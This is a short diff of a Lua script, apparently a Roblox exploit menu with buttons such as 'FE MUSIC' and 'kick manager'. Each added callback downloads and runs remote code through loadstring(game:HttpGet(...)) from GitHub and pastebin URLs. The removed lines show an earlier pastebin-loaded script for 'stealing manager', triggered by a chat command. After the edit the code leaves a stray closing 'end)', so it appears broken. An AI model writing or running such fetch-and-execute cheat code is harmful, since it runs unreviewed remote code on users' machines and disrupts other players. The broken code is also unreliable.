@@ -27,20 +27,14 @@ end
 Page.Button({
         Text = "FE MUSIC",
         Callback = function()
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BenLaden007/discordtitle/main/MainCode"))
 end
 })
 
  Page.Button({
         Text = "kick manager",
         Callback = function()
-game:GetService("StarterGui"):SetCore("SendNotification",{Title="PATCHED",Text="none of this shit works anymore except stealing manager. chat /manager", Duration=15})
-local steal = loadstring(game:HttpGet("https://pastebin.com/raw/DNtN6W4D"))
-workspace.Main.Chatted.Chatted.Event:Connect(function(msg)
-if msg=="/manager" or msg=="\\manager" then
-steal()
-end
+loadstring(game:HttpGet("https://pastebin.com/raw/eKuE2FQt"))
 end)
 
  Page.Button({
